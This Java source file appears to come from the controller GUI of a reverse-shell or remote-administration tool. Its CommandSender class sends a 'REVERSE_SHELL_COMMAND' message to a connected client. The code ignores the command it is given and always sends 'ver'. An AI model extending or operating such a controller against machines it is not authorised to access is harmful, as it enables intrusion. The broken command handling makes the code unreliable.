package GUI.TableUtils.ReverseShell;

import Information.AbstractEvent;
import Information.Action;
import org.json.JSONObject;

import javax.swing.*;
import java.io.IOException;


public class CommandSender extends AbstractEvent<ReverseShellGUI> {

    private final String command;

    public CommandSender(ReverseShellGUI reverseShellGUI, String command) {
        super(reverseShellGUI);
        this.command = command;
    }

    @Override
    public void run() {

        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION","REVERSE_SHELL_COMMAND");
        jsonObject.put("command", "ver");
        try {
            getClient().sendString(jsonObject.toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
